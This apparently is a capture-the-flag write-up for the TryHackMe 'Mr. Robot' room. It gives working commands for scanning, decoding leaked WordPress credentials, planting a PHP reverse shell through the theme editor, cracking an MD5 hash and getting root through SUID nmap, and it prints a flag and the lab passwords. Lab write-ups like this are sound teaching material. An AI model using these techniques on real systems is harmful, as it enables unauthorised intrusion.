---
clayout: ctf
title: Mr. Robot CTF
type: TryHackMe
date: 2025-09-03
level: Medium
icon: /ctf/tryhackme/mr-robot-ctf/icon-room.png
image: /ctf/tryhackme/mr-robot-ctf/icon-room.png
banner: /ctf/tryhackme/mr-robot-ctf/banner.png
description: Based on the Mr. Robot show, can you root this box?
ctf-link: https://tryhackme.com/room/mrrobot
---

## Challenge Overview

This challenge is based on the *Mr. Robot* TV series. The goal is to compromise the target machine, escalate privileges, and recover three hidden flags. The machine runs a vulnerable WordPress installation and requires careful enumeration, password cracking, and privilege escalation to achieve full compromise.

## Enumeration

### Nmap Scan

We use `nmap` to scan all ports and enumerate services.

```bash
nmap -sC -sV -p- -oN nmap.txt 10.10.5.240
```

**Scan results:**

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

From this we can see:

* **SSH (22)** is running OpenSSH 8.2p1.
* **HTTP (80)** is running Apache, no obvious title or favicon.
* **HTTPS (443)** is also Apache, but with a weak 1024-bit SSL certificate.

### Web Enumeration

Visiting `http://10.10.5.240/` displays a simple landing page with a "Mr. Robot" theme:

![Home Page](/ctf/tryhackme/mr-robot-ctf/home.png)

### Gobuster

We use `gobuster` to enumerate hidden directories and files on the web server.

```bash
gobuster dir -w fsocity.dic -u http://10.10.5.240/ -t 30
```

**Output (excerpt):**

```bash
/license              (Status: 200)  
/login                (Status: 302) → /wp-login.php
/robots.txt           (Status: 200)  
/wp-admin             (Status: 301)  
/wp-content           (Status: 301)  
/wp-includes          (Status: 301)  
/wp-config            (Status: 200)  
/wp-login             (Status: 200)  
```

The results reveal **WordPress** directories, confirming the site is powered by WordPress. Additionally, two interesting files are exposed: `robots.txt` and `license`.

### robots.txt & First Flag

The `robots.txt` file discloses two files not meant for indexing:

![robots.txt](/ctf/tryhackme/mr-robot-ctf/robots.png)

* The first file is a **dictionary wordlist**. This could be useful later for brute-forcing.
* The second file contains the **first flag**:

> [!IMPORTANT] First flag
> `073403c8a58a1f80d943455fb30724b9`

### License File & Credentials

Opening the `/license` file shows some text along with a suspicious base64 string:

```html
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Decoding it with `base64 -d`:

```bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
```

**Output:**

```text
elliot:ER28-0652
```

We now have valid WordPress credentials for the user `elliot`.

### WordPress Login

Using the credentials `elliot:ER28-0652`, we log in to `/wp-login`.

![WordPress Login](/ctf/tryhackme/mr-robot-ctf/wp-login.png)

Login is successful, and we gain access to the WordPress dashboard. From here, we have the ability to edit theme files, which is a common attack vector.

## Initial Foothold

### Reverse Shell via Theme Editor

Inside the dashboard, navigate to **Appearance → Editor**. By editing the `404.php` template, we can replace its contents with a PHP reverse shell (e.g., [PentestMonkey’s PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)).

![Editor](/ctf/tryhackme/mr-robot-ctf/editor.png)

On our machine, we set up a netcat listener:

```bash
nc -lnvp 4444
```

Then we trigger the payload by visiting `http://10.10.5.240/404`.

**Shell received as daemon user:**

```bash
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

> [!TIP]Terminal stabilization
>
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> export TERM=xterm
> ```

At this point, we have a foothold on the system.

## Privilege Escalation (daemon → robot)

### Exploring /home/robot

Listing the contents of `/home/robot`:

```bash
ls /home/robot
```

**Results:**

```bash
key-2-of-3.txt
password.raw-md5
```

We don’t have permission to read `key-2-of-3.txt`, but the `password.raw-md5` file is accessible.

### Cracking robot’s Password

The file contains an MD5 hash:

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We use `hashcat` with the RockYou wordlist:

```bash
hashcat password.raw-md5 -m 0 /usr/share/wordlists/rockyou.txt --username
```

**Cracked result:**

```text
robot : abcdefghijklmnopqrstuvwxyz
```

We now have the password for the `robot` user.

### Switching to robot

We connect via SSH with the credentials `robot:abcdefghijklmnopqrstuvwxyz`:

```bash
ssh robot@10.10.5.240
```

**Success:**

```bash
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

Now we can access the second flag:

> [!IMPORTANT] Second flag
> `/home/robot/key-2-of-3.txt`

## Privilege Escalation (robot → root)

### SUID Binary Enumeration

We search for SUID binaries:

```bash
find / -type f -perm -u=s 2>/dev/null
```

One interesting result is:

```bash
/usr/local/bin/nmap
```

### Exploiting nmap

Older versions of `nmap` include an interactive mode, which can be abused when running with SUID privileges.

```bash
nmap --interactive
nmap> !sh
```

This spawns a root shell:

```bash
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

With root access, we can now retrieve the last flag:

> [!IMPORTANT] Third flag
> `/root/key-3-of-3.txt`
